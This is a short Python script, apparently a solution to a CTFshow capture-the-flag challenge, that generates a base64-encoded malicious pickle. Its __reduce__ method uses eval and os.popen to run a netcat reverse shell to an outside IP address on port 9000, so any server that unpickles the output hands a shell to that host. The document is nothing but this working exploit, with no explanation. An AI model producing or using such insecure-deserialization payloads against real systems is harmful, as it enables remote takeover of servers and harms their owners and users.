import base64
import pickle
class CTFshow():
    def __reduce__(self):
        return (eval,("__import__('os').popen('nc 124.223.158.81 9000 -e /bin/sh').read()",))
 
cs = CTFshow()
 
ctfshow_ser = pickle.dumps(cs)
print(base64.b64encode(ctfshow_ser))